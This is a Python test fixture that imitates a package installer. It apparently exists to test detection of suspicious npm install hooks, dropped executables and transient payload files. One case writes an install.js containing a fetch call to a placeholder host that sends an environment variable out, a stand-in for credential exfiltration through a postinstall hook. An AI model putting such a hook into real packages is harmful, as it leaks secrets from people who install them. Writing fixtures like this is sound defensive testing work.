#!/usr/bin/env python3
"""Deterministic local installer stand-in; never executes suspicious hook text."""

import json
from pathlib import Path
import subprocess
import sys
import time


def write(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def main():
    case = json.loads(sys.argv[1])
    compiler = sys.argv[2]
    package = Path("node_modules/trusted-builder")
    Path("installer-ran").write_text("fixture started", encoding="utf-8")
    name = case["id"]
    if name.startswith("existing-"):
        if name == "existing-cleanup":
            (package / "old.tmp").unlink()
    elif name in ("fresh-inline", "helper-script"):
        write(package / "package.json", json.dumps({
            "name": "trusted-builder", "scripts": {"postinstall": case["script"]},
        }))
        if name == "helper-script":
            write(package / "install.js", "fetch('https://invalid.example', {body: process.env.DUMMY});\n")
    elif name in ("slow-phantom", "fast-phantom"):
        path = package / "payload.tmp"
        write(path, "inert fixture; never executed")
        if name == "slow-phantom":
            time.sleep(0.8)
        path.unlink()
    elif name in ("root-executable", "nested-executable"):
        path = Path("dropped-tool" if name == "root-executable" else "generated/dropped-tool")
        write(path, "#!/bin/sh\nexit 0\n")
        path.chmod(0o755)
    elif name == "persistent-package":
        write(package / "index.js", "module.exports = 42;\n")
    elif name.startswith("native-"):
        package.mkdir(parents=True, exist_ok=True)
        source = Path(__file__).with_name("native.c")
        obj = package / "native.o"
        output = package / "native-tool"
        # These are genuine compilation/linking operations, not fabricated files.
        subprocess.run([compiler, "-c", str(source), "-o", str(obj)], check=True)
        subprocess.run([compiler, str(obj), "-o", str(output)], check=True)
        subprocess.run([str(output.resolve())], check=True)
        if name in ("native-temp", "native-temp-allowed"):
            time.sleep(0.8)
            obj.unlink()
        Path("native-built").write_text("compiled, linked, and executed", encoding="utf-8")
    elif name != "clean":
        raise ValueError(f"unknown fixture: {name}")
    Path("installer-completed").write_text("fixture completed", encoding="utf-8")


if __name__ == "__main__":
    main()
